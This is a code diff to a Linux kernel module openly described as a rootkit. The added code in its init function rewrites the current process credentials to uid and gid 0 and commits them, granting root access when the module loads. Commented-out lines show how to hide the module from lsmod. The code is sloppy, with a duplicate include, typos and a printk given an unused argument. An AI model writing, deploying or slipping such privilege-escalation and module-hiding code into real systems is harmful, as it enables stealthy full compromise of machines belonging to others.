@@ -13,6 +13,25 @@
 #include <linux/module.h> // Core header for loading LKMs into the kernel
 #include <linux/kernel.h> // Contains types, macros, functions for the kernel
 
+#include <asm/unistd.h>
+#include <linux/cred.h>
+#include <linux/fs.h>
+#include <linux/kallsyms.h>
+#include <linux/kobject.h>
+#include <linux/list.h>
+#include <linux/proc_fs.h>
+#include <linux/rbtree.h>
+#include <linux/slab.h>
+#include <linux/string.h>
+#include <linux/syscalls.h>
+#include <linux/sysfs.h>
+#include <linux/uaccess.h>
+#include <linux/unistd.h>
+#include <linux/version.h>
+#include <linux/limits.h>
+#include <linux/delay.h>
+#include <linux/version.h>
+
 MODULE_LICENSE("GPL");                              ///< The license type -- this affects runtime behavior
 MODULE_AUTHOR("Moder amn security flbank elmasry"); ///< The author -- visible when you use modinfo
 MODULE_DESCRIPTION("A grootkit haha");              ///< The description -- see modinfo
@@ -32,11 +51,20 @@ static int __init rootkit_init(void)
 {
    printk(KERN_INFO "rootkit says: Greatings %s starting engine!\n", name);
 
-   /*invisble lsmod kernel*/
+   /*invisble kernel module*/
    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);
    // printk("invisible: module loaded\n");
    /*end invisible lsmod kernel*/
+
+
+   /* grant root access */
+   struct cred *creds = prepare_creds();
+   creds->uid.val = creds->euid.val = 0;
+   creds->gid.val = creds->egid.val = 0;
+   commit_creds(creds);
+   printk(KERN_INFO "rootkit says: Granted toot access\n", name);
+
    return 0;
 }
 
@@ -48,7 +76,6 @@ static void __exit rootkit_exit(void)
 {
    printk(KERN_INFO "rootkit says: Parking %s Engine off!\n", name);
 }
-
 
 /** @brief A module must use the module_init() module_exit() macros from linux/init.h, which
  *  identify the initialization function at insertion time and the cleanup function (as
